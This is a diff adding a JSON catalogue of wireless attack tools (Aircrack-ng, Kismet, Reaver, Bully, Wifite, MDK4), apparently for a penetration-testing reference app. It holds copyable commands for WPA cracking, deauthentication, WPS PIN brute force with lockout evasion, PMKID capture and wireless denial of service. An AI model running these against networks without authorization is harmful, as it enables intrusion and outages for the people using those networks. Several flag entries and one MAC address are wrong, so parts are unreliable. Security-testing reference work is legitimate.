@@ -1,0 +1,1210 @@
+[
+  {
+    "id": "aircrack-ng",
+    "name": "Aircrack-ng",
+    "summary": "Aircrack-ng is a complete suite of tools to assess WiFi network security, focusing on capturing packets and cracking WEP/WPA passwords.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install from apt and update regulatory database.",
+        "steps": [
+          {
+            "detail": "sudo apt update",
+            "copyable": true
+          },
+          {
+            "detail": "sudo apt install -y aircrack-ng",
+            "copyable": true
+          },
+          {
+            "detail": "sudo airmon-ng check kill",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Preinstalled; add drivers/firmware for external adapters.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y aircrack-ng firmware-atheros",
+            "copyable": true
+          },
+          {
+            "detail": "sudo iw reg set US",
+            "copyable": true
+          },
+          {
+            "detail": "aircrack-ng --help",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker / Alternative",
+        "summary": "Use kalilinux container for reproducible wireless labs.",
+        "steps": [
+          {
+            "detail": "docker pull kalilinux/kali-rolling",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling bash -lc 'apt update && apt install -y aircrack-ng'",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling airmon-ng",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Capture packets",
+        "command": "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture.cap wlan0mon",
+        "notes": []
+      },
+      {
+        "description": "Crack WPA handshake",
+        "command": "aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap",
+        "notes": []
+      },
+      {
+        "description": "Deauthenticate client",
+        "command": "sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55 wlan0mon",
+        "notes": []
+      },
+      {
+        "description": "Monitor mode setup",
+        "command": "sudo airmon-ng start wlan0",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-w",
+        "description": "Wordlist file"
+      },
+      {
+        "flag": "-b",
+        "description": "BSSID of target"
+      },
+      {
+        "flag": "-c",
+        "description": "Channel number"
+      },
+      {
+        "flag": "-w",
+        "description": "Write to file"
+      },
+      {
+        "flag": "-0",
+        "description": "Deauthentication mode"
+      },
+      {
+        "flag": "-a",
+        "description": "Access point BSSID"
+      },
+      {
+        "flag": "-5",
+        "description": "Number of packets"
+      }
+    ],
+    "operational_tips": [
+      "Ensure wireless card supports monitor mode.",
+      "Capture WPA handshake before cracking.",
+      "Use good wordlists for better success rates.",
+      "Be aware of legal requirements for wireless testing."
+    ],
+    "step_sequences": [
+      {
+        "title": "Capturing and cracking WPA2",
+        "steps": [
+          {
+            "title": "Enable monitor mode",
+            "details": "Use airmon-ng to place adapter into monitor mode.",
+            "command": "sudo airmon-ng start wlan0"
+          },
+          {
+            "title": "Capture handshake",
+            "details": "Use airodump-ng to record packets for target BSSID/channel.",
+            "command": "sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon"
+          },
+          {
+            "title": "Force re-auth",
+            "details": "Send deauth frames to capture a fresh handshake.",
+            "command": "sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 wlan0mon"
+          },
+          {
+            "title": "Crack",
+            "details": "Run aircrack-ng with a wordlist to recover passphrase.",
+            "command": "aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Wireless attack chain",
+        "stages": [
+          {
+            "label": "Recon",
+            "description": "Use Kismet or airodump-ng to identify targets.",
+            "command": "kismet -c wlan0mon"
+          },
+          {
+            "label": "Capture",
+            "description": "Use Wifite/airodump to collect handshakes or PMKIDs.",
+            "command": "wifite -i wlan0mon -d 10"
+          },
+          {
+            "label": "Crack",
+            "description": "Use aircrack-ng or hashcat to recover keys from captured files.",
+            "command": "aircrack-ng handshakes/wpa.cap -w wordlists/custom.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "Reading packets, please wait...",
+        "meaning": "Aircrack is processing the capture; ensure handshake count >1 if progress stalls.",
+        "severity": "info"
+      },
+      {
+        "indicator": "KEY FOUND! [ passphrase ]",
+        "meaning": "Password recovered; verify with wpa_supplicant or wpa_cli.",
+        "severity": "high"
+      },
+      {
+        "indicator": "No valid WPA handshakes found",
+        "meaning": "Capture did not include a full handshake; repeat capture/deauth.",
+        "severity": "warning"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "PMKID attacks",
+        "scenario": "Recover PSKs without clients connected.",
+        "command": "hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 && hcxpcaptool -z hashes.16800 pmkid.pcapng && hashcat -m 16800 hashes.16800 wordlists/custom.txt",
+        "notes": [
+          "Use hcxdumptool/hcxpcaptool to capture PMKIDs, then crack with hashcat or aircrack.",
+          "Ensure local regulations allow PMKID/handshake collection."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "Aircrack-ng docs",
+        "url": "https://www.aircrack-ng.org/doku.php",
+        "description": "Official documentation and tutorials."
+      }
+    ]
+  },
+  {
+    "id": "kismet",
+    "name": "Kismet",
+    "summary": "Kismet is a wireless network detector, sniffer, and intrusion detection system that works with 802.11 layer2 wireless networks.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install from official repository for latest hardware support.",
+        "steps": [
+          {
+            "detail": "sudo apt update",
+            "copyable": true
+          },
+          {
+            "detail": "sudo apt install -y kismet",
+            "copyable": true
+          },
+          {
+            "detail": "sudo usermod -a -G kismet $USER",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Kali ships kismet; update plugin packs and enable capabilities.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y kismet kismet-plugins",
+            "copyable": true
+          },
+          {
+            "detail": "sudo setcap cap_net_admin,cap_net_raw=eip /usr/bin/kismet",
+            "copyable": true
+          },
+          {
+            "detail": "kismet --version",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker / Alternative",
+        "summary": "Use the upstream container for passive recon dashboards.",
+        "steps": [
+          {
+            "detail": "docker pull kismet/kismet",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kismet/kismet",
+            "copyable": true
+          },
+          {
+            "detail": "firefox https://localhost:2501",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Start Kismet",
+        "command": "sudo kismet -c kismet.conf",
+        "notes": []
+      },
+      {
+        "description": "Capture to specific file",
+        "command": "sudo kismet -t capture.kismet",
+        "notes": []
+      },
+      {
+        "description": "With specific interface",
+        "command": "sudo kismet -i wlan0mon",
+        "notes": []
+      },
+      {
+        "description": "GPS logging",
+        "command": "sudo kismet --use-gps",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-c",
+        "description": "Configuration file"
+      },
+      {
+        "flag": "-i",
+        "description": "Capture interface"
+      },
+      {
+        "flag": "-t",
+        "description": "Capture file prefix"
+      },
+      {
+        "flag": "-f",
+        "description": "Force override"
+      },
+      {
+        "flag": "--use-gps",
+        "description": "Enable GPS logging"
+      },
+      {
+        "flag": "-n",
+        "description": "No splash screen"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      }
+    ],
+    "operational_tips": [
+      "Configure properly before starting captures.",
+      "Use GPS for location-based analysis.",
+      "Monitor for extended periods for comprehensive data.",
+      "Review captured data for network mapping."
+    ],
+    "step_sequences": [
+      {
+        "title": "Wireless reconnaissance",
+        "steps": [
+          {
+            "title": "Configure sources",
+            "details": "Add wireless interfaces (wlan0mon, rtl433, etc.)",
+            "command": "kismet -c wlan0mon"
+          },
+          {
+            "title": "Tag targets",
+            "details": "Use the UI to label SSIDs/BSSIDs of interest.",
+            "command": "Kismet UI -> Networks -> Tag"
+          },
+          {
+            "title": "Export data",
+            "details": "Save KML/CSV for mapping and reporting.",
+            "command": "Kismet UI -> Data Sources -> Export -> KML"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Wireless Network Discovery and WPA/WEP Cracking Workflow",
+        "stages": [
+          {
+            "label": "Passive recon",
+            "description": "Use Kismet to identify channels, encryption, and clients.",
+            "command": "kismet -c wlan0mon"
+          },
+          {
+            "label": "Focused capture",
+            "description": "Feed BSSID/channel to airodump for handshake capture.",
+            "command": "airodump-ng -c 11 --bssid 11:22:33:44:55:66 -w capture wlan0mon"
+          },
+          {
+            "label": "Crack",
+            "description": "Use Aircrack/Hashcat to recover PSKs.",
+            "command": "aircrack-ng capture-01.cap -w wordlists/custom.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "INFO: Started new datasource",
+        "meaning": "Adapter is in monitor mode and feeding packets.",
+        "severity": "info"
+      },
+      {
+        "indicator": "WARN: Source dropped packets",
+        "meaning": "Interface is overloaded; reduce channels or use additional adapters.",
+        "severity": "warning"
+      },
+      {
+        "indicator": "Alert: WPS-enabled network detected",
+        "meaning": "Flag network for tools like Reaver or Bully.",
+        "severity": "medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Remote drone capture",
+        "scenario": "Deploy Kismet drones on remote sensors feeding a central server.",
+        "command": "kismet_capture -c wlan0 -s tcp://kismet-server:3501",
+        "notes": [
+          "Use TLS and API keys for secure telemetry.",
+          "Ideal for large campuses where multiple vantage points needed."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "Kismet docs",
+        "url": "https://www.kismetwireless.net/docs/",
+        "description": "Configuration and sensor deployment guides."
+      }
+    ]
+  },
+  {
+    "id": "reaver",
+    "name": "Reaver",
+    "summary": "Reaver implements a brute force attack against WiFi Protected Setup (WPS) registrar PINs to recover WPA/WPA2 passphrases.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install via apt and enable monitor mode support.",
+        "steps": [
+          {
+            "detail": "sudo apt update",
+            "copyable": true
+          },
+          {
+            "detail": "sudo apt install -y reaver aircrack-ng",
+            "copyable": true
+          },
+          {
+            "detail": "sudo airmon-ng start wlan0",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Preinstalled; update to latest SVN for additional chipset support.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y reaver",
+            "copyable": true
+          },
+          {
+            "detail": "sudo wash -i wlan0mon",
+            "copyable": true
+          },
+          {
+            "detail": "reaver --help",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker / Alternative",
+        "summary": "Use kalilinux container when host OS lacks wireless tools.",
+        "steps": [
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling bash -lc 'apt update && apt install -y reaver'",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling reaver -h",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling wash -i wlan0mon",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic WPS attack",
+        "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv",
+        "notes": []
+      },
+      {
+        "description": "With custom timeout",
+        "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -t 10 -vv",
+        "notes": []
+      },
+      {
+        "description": "Fixed channel",
+        "command": "reaver -i wlan0mon -c 6 -b AA:BB:CC:DD:EE:FF -vv",
+        "notes": []
+      },
+      {
+        "description": "With PIXIE Dust attack",
+        "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF --pixie-dust -vv",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-i",
+        "description": "Wireless interface"
+      },
+      {
+        "flag": "-b",
+        "description": "Target BSSID"
+      },
+      {
+        "flag": "-c",
+        "description": "Channel number"
+      },
+      {
+        "flag": "-t",
+        "description": "Timeout in seconds"
+      },
+      {
+        "flag": "-vv",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "--pixie-dust",
+        "description": "PIXIE Dust attack"
+      },
+      {
+        "flag": "-p",
+        "description": "WPS PIN"
+      },
+      {
+        "flag": "-d",
+        "description": "Delay between attempts"
+      }
+    ],
+    "operational_tips": [
+      "Ensure stable connection to target AP.",
+      "Monitor for lockouts and adjust timing.",
+      "PIXIE Dust attack is faster on vulnerable routers.",
+      "Document all WPS vulnerabilities found."
+    ],
+    "step_sequences": [
+      {
+        "title": "WPS brute force",
+        "steps": [
+          {
+            "title": "Discover WPS APs",
+            "details": "Use wash to list targets.",
+            "command": "wash -i wlan0mon"
+          },
+          {
+            "title": "Launch reaver",
+            "details": "Target BSSID/channel with --no-associate if using external association.",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv"
+          },
+          {
+            "title": "Resume",
+            "details": "Use --session to resume interrupted attempts.",
+            "command": "reaver --session=reaver-session -i wlan0mon -b 00:11:22:33:44:55 -vv"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Kismet \u2192 Reaver \u2192 Credential reuse",
+        "stages": [
+          {
+            "label": "Identify WPS targets",
+            "description": "Use Kismet/wash to flag WPS-enabled APs.",
+            "command": "wash -i wlan0mon"
+          },
+          {
+            "label": "Brute WPS",
+            "description": "Run Reaver or Bully to recover the PIN/PSK.",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -vv"
+          },
+          {
+            "label": "Crack reuse",
+            "description": "Use recovered PSK for lateral movement or wordlist seeding.",
+            "command": "aircrack-ng handshake.cap -w psk_list.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] Pin cracked in 01:34:12",
+        "meaning": "WPS PIN recovered; PSK printed below.",
+        "severity": "high"
+      },
+      {
+        "indicator": "[!] WARNING: Failed to associate",
+        "meaning": "Adapter could not associate; try --no-associate or adjust distance.",
+        "severity": "warning"
+      },
+      {
+        "indicator": "[+] WPS PIN: 12345670",
+        "meaning": "PIN discovered; PSK should follow if not locked down.",
+        "severity": "high"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Timeout tuning",
+        "scenario": "Adjust delays to avoid AP lockout.",
+        "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -d 5 -x 60 -vv",
+        "notes": [
+          "-d sets delay between pin attempts; -x sets max retries before sleeping.",
+          "Monitor AP logs to coordinate with blue teams."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "Reaver-wps repository",
+        "url": "https://github.com/t6x/reaver-wps-fork-t6x",
+        "description": "Updated fork and documentation."
+      }
+    ]
+  },
+  {
+    "id": "bully",
+    "name": "Bully",
+    "summary": "Bully is a WPS brute force tool that implements a brute force attack against WiFi Protected Setup (WPS) PINs.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Build from source for best chipset compatibility.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y build-essential libpcap-dev aircrack-ng",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/aanarchyy/bully.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd bully/src && make && sudo make install",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Install from apt repo.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y bully",
+            "copyable": true
+          },
+          {
+            "detail": "bully --help",
+            "copyable": true
+          },
+          {
+            "detail": "bully --5ghz",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker / Alternative",
+        "summary": "Use kali container when local OS lacks dependencies.",
+        "steps": [
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling bash -lc 'apt update && apt install -y bully'",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling bully -h",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling wash -i wlan0mon",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic WPS attack",
+        "command": "bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 4",
+        "notes": []
+      },
+      {
+        "description": "With PIN length",
+        "command": "bully wlan0mon -b AA:BB:CC:DD:EE:FF -l 8 -v 4",
+        "notes": []
+      },
+      {
+        "description": "Force specific channel",
+        "command": "bully wlan0mon -c 6 -b AA:BB:CC:DD:EE:FF -v 4",
+        "notes": []
+      },
+      {
+        "description": "With custom delay",
+        "command": "bully wlan0mon -b AA:BB:CC:DD:EE:FF -d 2 -v 4",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-b",
+        "description": "Target BSSID"
+      },
+      {
+        "flag": "-c",
+        "description": "Channel number"
+      },
+      {
+        "flag": "-l",
+        "description": "PIN length"
+      },
+      {
+        "flag": "-d",
+        "description": "Delay between attempts"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose level (1-5)"
+      },
+      {
+        "flag": "-s",
+        "description": "Skip first PIN"
+      },
+      {
+        "flag": "-f",
+        "description": "Force operation"
+      }
+    ],
+    "operational_tips": [
+      "Start with default PIN length of 8.",
+      "Monitor for AP lockouts and adjust timing.",
+      "Use verbose output to monitor progress.",
+      "Combine with other wireless tools for testing."
+    ],
+    "step_sequences": [
+      {
+        "title": "WPS brute force with Bully",
+        "steps": [
+          {
+            "title": "Identify target",
+            "details": "Use wash/kismet to list WPS-enabled APs.",
+            "command": "wash -i wlan0mon"
+          },
+          {
+            "title": "Run bully",
+            "details": "Use aggressive or incremental modes as required.",
+            "command": "bully wlan0mon -b 00:11:22:33:44:55 -c 6 --bruteforce"
+          },
+          {
+            "title": "Handle lockouts",
+            "details": "Use delay/retry options to bypass lockouts.",
+            "command": "bully wlan0mon -b 00:11:22:33:44:55 -c 6 -T 2 -d"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Reaver/Bully tag team",
+        "stages": [
+          {
+            "label": "Recon",
+            "description": "Use Kismet/wash to find WPS target.",
+            "command": "wash -i wlan0mon"
+          },
+          {
+            "label": "Primary attack",
+            "description": "Run Bully for speed; fall back to Reaver for flaky APs.",
+            "command": "bully wlan0mon -b 00:11:22:33:44:55"
+          },
+          {
+            "label": "Credential use",
+            "description": "Reuse PSK or seed wordlists for Aircrack/Hashcat.",
+            "command": "aircrack-ng capture.cap -w recovered_psk.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] PIN: 12345670",
+        "meaning": "PIN recovered; PSK should appear next.",
+        "severity": "high"
+      },
+      {
+        "indicator": "[!] WPS transaction failed (timeout)",
+        "meaning": "Reduce aggressiveness or relocate closer to AP.",
+        "severity": "warning"
+      },
+      {
+        "indicator": "[+] WPA PSK: Password123",
+        "meaning": "Network key recovered; document in report.",
+        "severity": "high"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Custom PIN file",
+        "scenario": "Use known/default PINs before brute force.",
+        "command": "bully wlan0mon -b 00:11:22:33:44:55 -F pins.txt",
+        "notes": [
+          "Pre-populate pins.txt with vendor default PINs.",
+          "Reduces lockout risk by testing fewer guesses."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "Bully GitHub",
+        "url": "https://github.com/aanarchyy/bully",
+        "description": "Documentation and source."
+      }
+    ]
+  },
+  {
+    "id": "wifite",
+    "name": "Wifite",
+    "summary": "Wifite is a wireless auditor that attacks multiple WEP, WPA, and WPS networks in a row.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install via pipx for latest release.",
+        "steps": [
+          {
+            "detail": "python3 -m pip install --user pipx",
+            "copyable": true
+          },
+          {
+            "detail": "pipx install wifite",
+            "copyable": true
+          },
+          {
+            "detail": "wifite --help",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Ships with Kali; update wordlists/adapters.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y wifite",
+            "copyable": true
+          },
+          {
+            "detail": "sudo airmon-ng check kill",
+            "copyable": true
+          },
+          {
+            "detail": "wifite -v",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker / Alternative",
+        "summary": "Use container for scripted engagements.",
+        "steps": [
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling bash -lc 'apt update && apt install -y wifite'",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling wifite -h",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling wifite -i wlan0mon",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Scan and attack all networks",
+        "command": "sudo wifite2 -i wlan0mon",
+        "notes": []
+      },
+      {
+        "description": "Attack specific network",
+        "command": "sudo wifite2 -i wlan0mon -b AA:BB:CC:DD:EE:FF",
+        "notes": []
+      },
+      {
+        "description": "WPS only mode",
+        "command": "sudo wifite2 -i wlan0mon --wps",
+        "notes": []
+      },
+      {
+        "description": "With wordlist",
+        "command": "sudo wifite2 -i wlan0mon -w wordlist.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-i",
+        "description": "Wireless interface"
+      },
+      {
+        "flag": "-b",
+        "description": "Target BSSID"
+      },
+      {
+        "flag": "-w",
+        "description": "Wordlist for WPA"
+      },
+      {
+        "flag": "--wps",
+        "description": "WPS attack only"
+      },
+      {
+        "flag": "--all",
+        "description": "Attack all networks"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-p",
+        "description": "Passive scanning"
+      }
+    ],
+    "operational_tips": [
+      "Automates multiple attack types efficiently.",
+      "Good for testing multiple networks quickly.",
+      "Monitor progress and adjust parameters as needed.",
+      "Be aware of legal requirements for testing."
+    ],
+    "step_sequences": [
+      {
+        "title": "Automated capture",
+        "steps": [
+          {
+            "title": "Launch",
+            "details": "Select interface and scan for targets.",
+            "command": "sudo wifite"
+          },
+          {
+            "title": "Pick target",
+            "details": "Wifite lists networks; choose target ID.",
+            "command": "[1] Select target"
+          },
+          {
+            "title": "Capture handshake",
+            "details": "Wifite runs airodump/aireplay automatically; monitor status.",
+            "command": "wifite -i wlan0mon --handshake"
+          },
+          {
+            "title": "Crack",
+            "details": "Automatically attempts crack via aircrack/hashcat; specify custom wordlist if desired.",
+            "command": "wifite --dict wordlists/custom.txt"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Wifite automation chain",
+        "stages": [
+          {
+            "label": "Recon",
+            "description": "Use Kismet or wifite scan to find networks.",
+            "command": "wifite --scan"
+          },
+          {
+            "label": "Capture",
+            "description": "Run wifite to grab handshakes/PMKIDs.",
+            "command": "wifite -i wlan0mon --pmkid"
+          },
+          {
+            "label": "Crack",
+            "description": "Use aircrack/hashcat with captured files.",
+            "command": "aircrack-ng wifite-hs.cap -w custom.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] captured handshake",
+        "meaning": "Handshake stored under wifite/ directory; proceed to cracking.",
+        "severity": "info"
+      },
+      {
+        "indicator": "[-] failed to capture handshake",
+        "meaning": "AP/client may be far away; increase retries or use targeted deauth.",
+        "severity": "warning"
+      },
+      {
+        "indicator": "[+] saved to: wifite-2024-11-22-01.cap",
+        "meaning": "Capture saved; record path in notes.",
+        "severity": "info"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Custom attack mix",
+        "scenario": "Disable slow attacks and focus on handshake capture.",
+        "command": "wifite --no-wps --no-pmkid --handshake --dict custom.txt",
+        "notes": [
+          "Use --persist to resume previous sessions.",
+          "Combine with Crunch/CeWL wordlists for targeted cracking."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "Wifite wiki",
+        "url": "https://github.com/derv82/wifite2",
+        "description": "Usage and configuration."
+      }
+    ]
+  },
+  {
+    "id": "mdk4",
+    "name": "MDK4",
+    "summary": "MDK4 is a wireless attack tool that implements various attacks including deauthentication, beacon flooding, and packet injection.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Build from source for the latest attack suites.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y libpcap-dev libssl-dev",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/aircrack-ng/mdk4.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd mdk4 && make && sudo make install",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Install via apt.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y mdk4",
+            "copyable": true
+          },
+          {
+            "detail": "mdk4 --help",
+            "copyable": true
+          },
+          {
+            "detail": "sudo airmon-ng start wlan0",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker / Alternative",
+        "summary": "Run attacks from containerized Kali.",
+        "steps": [
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling bash -lc 'apt update && apt install -y mdk4'",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling mdk4 --help",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling mdk4 wlan0mon d",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Beacon flood attack",
+        "command": "sudo mdk4 wlan0mon b -f AA:BB:CC:DD:EE:FF",
+        "notes": []
+      },
+      {
+        "description": "Deauthentication attack",
+        "command": "sudo mdk4 wlan0mon d -c AA:BB:CC:DD:EE:FF",
+        "notes": []
+      },
+      {
+        "description": "EAPOL start flood",
+        "command": "sudo mdk4 wlan0mon e -f AA:BB:CC:DD:EE:FF",
+        "notes": []
+      },
+      {
+        "description": "Authentication DOS",
+        "command": "sudo mdk4 wlan0mon a -i AA:BB:CC:DD:EE:FF",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "b",
+        "description": "Beacon flood attack"
+      },
+      {
+        "flag": "d",
+        "description": "Deauthentication attack"
+      },
+      {
+        "flag": "e",
+        "description": "EAPOL start flood"
+      },
+      {
+        "flag": "a",
+        "description": "Authentication DOS"
+      },
+      {
+        "flag": "-f",
+        "description": "Target BSSID"
+      },
+      {
+        "flag": "-c",
+        "description": "Channel number"
+      },
+      {
+        "flag": "-i",
+        "description": "Target BSSID"
+      }
+    ],
+    "operational_tips": [
+      "Use for testing wireless network robustness.",
+      "Be careful with DOS attacks on production networks.",
+      "Monitor network responses during attacks.",
+      "Document all wireless vulnerabilities found."
+    ],
+    "step_sequences": [
+      {
+        "title": "Common mdk4 attack modes",
+        "steps": [
+          {
+            "title": "Deauth",
+            "details": "Force clients off the AP.",
+            "command": "mdk4 wlan0mon d -b blacklist.txt"
+          },
+          {
+            "title": "WIDS/WIPS confusion",
+            "details": "Send randomized beacon frames to test detections.",
+            "command": "mdk4 wlan0mon b"
+          },
+          {
+            "title": "TSC exhaustion",
+            "details": "Exhaust TKIP IV space to cause rekey.",
+            "command": "mdk4 wlan0mon t"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "MDK4 Wireless Security Testing and Stress Testing Suite",
+        "stages": [
+          {
+            "label": "Baseline",
+            "description": "Monitor with Wireshark/Kismet before attacks.",
+            "command": "kismet -c wlan0mon"
+          },
+          {
+            "label": "Execute mdk4",
+            "description": "Run targeted modes (deauth/beacon flood).",
+            "command": "mdk4 wlan0mon d -b targets.txt"
+          },
+          {
+            "label": "Assess",
+            "description": "Capture reaction with Wireshark and log detection events.",
+            "command": "tshark -i wlan0mon -f 'wlan subtype deauth'"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] Sending deauth frames",
+        "meaning": "Attack is active; coordinate with blue team to avoid unintended outages.",
+        "severity": "warning"
+      },
+      {
+        "indicator": "Packets sent: 1000",
+        "meaning": "Progress indicator; adjust runtime as needed.",
+        "severity": "info"
+      },
+      {
+        "indicator": "No beacons received",
+        "meaning": "Adapter may not be in monitor mode or channel locked; reconfigure before re-running.",
+        "severity": "warning"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Targeted client deauth",
+        "scenario": "Only disconnect specific client MACs.",
+        "command": "mdk4 wlan0mon d -c 6 -s 00:aa:bb:cc:dd:ee",
+        "notes": [
+          "Use -s to scope to client MAC addresses.",
+          "Ensure attack is authorized; high risk of service disruption."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "mdk4 wiki",
+        "url": "https://github.com/aircrack-ng/mdk4",
+        "description": "Modes and examples."
+      }
+    ]
+  }
+]
